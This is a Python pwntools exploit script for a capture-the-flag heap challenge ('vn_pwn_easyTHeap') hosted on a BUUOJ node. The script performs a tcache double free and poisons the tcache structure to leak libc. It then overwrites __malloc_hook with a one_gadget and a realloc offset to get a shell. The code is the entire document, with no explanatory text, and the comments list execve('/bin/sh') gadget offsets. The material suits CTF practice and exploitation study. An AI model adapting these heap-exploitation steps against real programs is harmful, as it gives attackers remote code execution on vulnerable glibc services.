from pwn import *
#context.log_level='debug'

def add(size):
	p.sendlineafter('choice: ','1')
	p.sendlineafter('size?',str(size))


def edit(idx,content):
	p.sendlineafter('choice: ','2')
	p.sendlineafter('idx?',str(idx))
	p.sendafter('content:',content)

def show(idx):
	p.sendlineafter('choice: ','3')
	p.sendlineafter('idx?',str(idx))

def free(idx):
	p.sendlineafter('choice: ','4')
	p.sendlineafter('idx?',str(idx))


libc = ELF('/lib/x86_64-linux-gnu/libc.so.6',checksec=False)
#p = process('vn_pwn_easyTHeap')
p = remote('node3.buuoj.cn',28950)

add(0x88) # 0
add(0x88) # 1
#add(0x68) 
free(1)
free(1)

add(0x88) # 2
edit(2,'\x10\x10') # 
# #gdb.attach(p)
add(0x88) # 3
#edit(2,'AA')
add(0x88) # 4
edit(4,'\x07'*8)


#edit(3,'\x0a')
free(0)
show(0)
libc_base = u64(p.recv(6).ljust(8,'\x00'))-0x3ebca0
print hex(libc_base)
malloc_hook = libc_base + libc.sym['__malloc_hook']
system = libc_base + libc.sym['system']
one_gadget = libc_base + 0x4f322

realloc = libc_base + libc.sym['__libc_realloc']

edit(4,'\x07'*8+p64(0)*12+p64(malloc_hook-0x8))
add(0x68) # 5
edit(5,p64(one_gadget)+p64(realloc+8))

add(0x66)
#gdb.attach(p)
p.interactive()


# 0x4f2c5 execve("/bin/sh", rsp+0x40, environ)
# constraints:
#   rcx == NULL

# 0x4f322 execve("/bin/sh", rsp+0x40, environ)
# constraints:
#   [rsp+0x40] == NULL

# 0x10a38c execve("/bin/sh", rsp+0x70, environ)
# constraints:
#   [rsp+0x70] == NULL
